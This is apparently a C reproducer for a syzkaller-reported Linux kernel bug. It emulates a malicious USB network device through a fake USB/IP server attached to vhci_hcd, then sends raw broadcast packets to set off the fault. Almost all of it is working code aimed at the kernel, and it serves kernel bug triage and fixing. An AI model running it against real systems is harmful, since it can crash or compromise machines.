// https://syzkaller.appspot.com/bug?id=ab42f4ef14e6a7557d8e81e7e97ebfb8fed9bbb8
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <pthread.h>
#include <stdint.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <errno.h>

struct usbip_header_basic {
    uint32_t command;
    uint32_t seqnum;
    uint32_t devid;
    uint32_t direction;
    uint32_t ep;
} __attribute__((packed));

struct usbip_header_cmd_submit {
    uint32_t transfer_flags;
    int32_t transfer_buffer_length;
    int32_t start_frame;
    int32_t number_of_packets;
    int32_t interval;
    unsigned char setup[8];
} __attribute__((packed));

struct usbip_header_ret_submit {
    int32_t status;
    int32_t actual_length;
    int32_t start_frame;
    int32_t number_of_packets;
    int32_t error_count;
} __attribute__((packed));

struct usbip_header_cmd_unlink {
    uint32_t seqnum;
} __attribute__((packed));

struct usbip_header_ret_unlink {
    int32_t status;
} __attribute__((packed));

struct usbip_header {
    struct usbip_header_basic base;
    union {
        struct usbip_header_cmd_submit cmd_submit;
        struct usbip_header_ret_submit ret_submit;
        struct usbip_header_cmd_unlink cmd_unlink;
        struct usbip_header_ret_unlink ret_unlink;
    } u;
} __attribute__((packed));

static const uint8_t dev_desc[] = {
    18, 1, 0x00, 0x02, 0x00, 0x00, 0x00, 64,
    0x52, 0x0b, 0x22, 0x38, 0x00, 0x01, 0, 0, 0, 1
};

static const uint8_t config_desc[] = {
    9, 2, 32, 0, 1, 1, 0, 0x80, 50,
    9, 4, 0, 0, 2, 0x02, 0x0c, 0x07, 0,
    7, 5, 0x81, 2, 0x00, 0x02, 0,
    7, 5, 0x02, 2, 0x00, 0x02, 0
};

int read_exact(int fd, void *buf, size_t len) {
    size_t done = 0;
    while (done < len) {
        int r = read(fd, (char *)buf + done, len - done);
        if (r <= 0) return r;
        done += r;
    }
    return done;
}

int write_exact(int fd, const void *buf, size_t len) {
    size_t done = 0;
    while (done < len) {
        int r = write(fd, (const char *)buf + done, len - done);
        if (r <= 0) return r;
        done += r;
    }
    return done;
}

void *server_thread(void *arg) {
    int fd = (int)(intptr_t)arg;
    struct usbip_header req;
    
    while (read_exact(fd, &req, sizeof(req)) == sizeof(req)) {
        uint32_t command = ntohl(req.base.command);
        uint32_t seqnum = ntohl(req.base.seqnum);
        uint32_t devid = ntohl(req.base.devid);
        uint32_t direction = ntohl(req.base.direction);
        uint32_t ep = ntohl(req.base.ep);
        
        if (command == 1) { /* USBIP_CMD_SUBMIT */
            int32_t transfer_buffer_length = ntohl(req.u.cmd_submit.transfer_buffer_length);
            struct usbip_header resp;
            memset(&resp, 0, sizeof(resp));
            resp.base.command = htonl(3); /* USBIP_RET_SUBMIT */
            resp.base.seqnum = htonl(seqnum);
            resp.base.devid = htonl(devid);
            resp.base.direction = htonl(direction);
            resp.base.ep = htonl(ep);
            
            uint8_t data[1024];
            int data_len = 0;
            
            if (direction == 0 && transfer_buffer_length > 0) {
                int to_read = transfer_buffer_length;
                char drain_buf[1024];
                while (to_read > 0) {
                    int chunk = to_read > sizeof(drain_buf) ? sizeof(drain_buf) : to_read;
                    int r = read_exact(fd, drain_buf, chunk);
                    if (r <= 0) break;
                    to_read -= r;
                }
            }
            
            if (ep == 0) {
                uint8_t bRequestType = req.u.cmd_submit.setup[0];
                uint8_t bRequest = req.u.cmd_submit.setup[1];
                uint16_t wValue = req.u.cmd_submit.setup[2] | (req.u.cmd_submit.setup[3] << 8);
                uint16_t wLength = req.u.cmd_submit.setup[6] | (req.u.cmd_submit.setup[7] << 8);
                
                if (bRequestType == 0x80 && bRequest == 6) { /* GET_DESCRIPTOR */
                    if ((wValue >> 8) == 1) {
                        data_len = sizeof(dev_desc);
                        memcpy(data, dev_desc, data_len);
                    } else if ((wValue >> 8) == 2) {
                        data_len = sizeof(config_desc);
                        memcpy(data, config_desc, data_len);
                    }
                    if (data_len > wLength) data_len = wLength;
                }
            }
            
            if (ep == 1 && direction == 1) {
                resp.u.ret_submit.status = htonl(-104); /* -ECONNRESET */
            } else {
                resp.u.ret_submit.status = htonl(0);
            }
            
            if (direction == 1) {
                resp.u.ret_submit.actual_length = htonl(data_len);
            } else {
                resp.u.ret_submit.actual_length = htonl(transfer_buffer_length);
            }
            
            write_exact(fd, &resp, sizeof(resp));
            if (direction == 1 && data_len > 0) {
                write_exact(fd, data, data_len);
            }
        } else if (command == 2) { /* USBIP_CMD_UNLINK */
            struct usbip_header resp;
            memset(&resp, 0, sizeof(resp));
            resp.base.command = htonl(4); /* USBIP_RET_UNLINK */
            resp.base.seqnum = htonl(seqnum);
            resp.base.devid = htonl(devid);
            resp.base.direction = htonl(direction);
            resp.base.ep = htonl(ep);
            resp.u.ret_unlink.status = htonl(0);
            write_exact(fd, &resp, sizeof(resp));
        }
    }
    return NULL;
}

void trigger_tx() {
    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        printf("[-] socket(AF_PACKET) failed: %s\n", strerror(errno));
        return;
    }
    printf("[+] socket(AF_PACKET) successful.\n");
    
    for (int i = 1; i < 100; i++) {
        struct ifreq ifr;
        ifr.ifr_ifindex = i;
        if (ioctl(sock, SIOCGIFNAME, &ifr) == 0) {
            if (strncmp(ifr.ifr_name, "lo", 2) != 0) {
                if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
                    ifr.ifr_flags |= IFF_UP;
                    ioctl(sock, SIOCSIFFLAGS, &ifr);
                }
                
                struct sockaddr_ll sall = {0};
                sall.sll_family = AF_PACKET;
                sall.sll_ifindex = i;
                sall.sll_halen = ETH_ALEN;
                char packet[64] = {0};
                memset(packet, 0xff, 6); /* Broadcast MAC */
                sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&sall, sizeof(sall));
                printf("[+] Sent packet to interface %s\n", ifr.ifr_name);
            }
        }
    }
    close(sock);
}

int main() {
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
        printf("[-] socketpair failed: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] socketpair successful.\n");
    
    pthread_t tid;
    if (pthread_create(&tid, NULL, server_thread, (void *)(intptr_t)sv[0]) != 0) {
        printf("[-] pthread_create failed: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] pthread_create successful.\n");
    
    int attach_fd = open("/sys/devices/platform/vhci_hcd.0/attach", O_WRONLY);
    if (attach_fd < 0) {
        printf("[-] open attach failed: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] open attach successful.\n");
    
    char buf[256];
    snprintf(buf, sizeof(buf), "0 %d 1 3", sv[1]);
    if (write(attach_fd, buf, strlen(buf)) < 0) {
        printf("[-] write attach failed: %s\n", strerror(errno));
        exit(1);
    }
    printf("[+] write attach successful.\n");
    close(attach_fd);
    
    printf("[+] Waiting for enumeration...\n");
    sleep(5);
    
    printf("[+] Triggering TX...\n");
    trigger_tx();
    
    printf("[+] Waiting for completion...\n");
    sleep(2);
    
    return 0;
}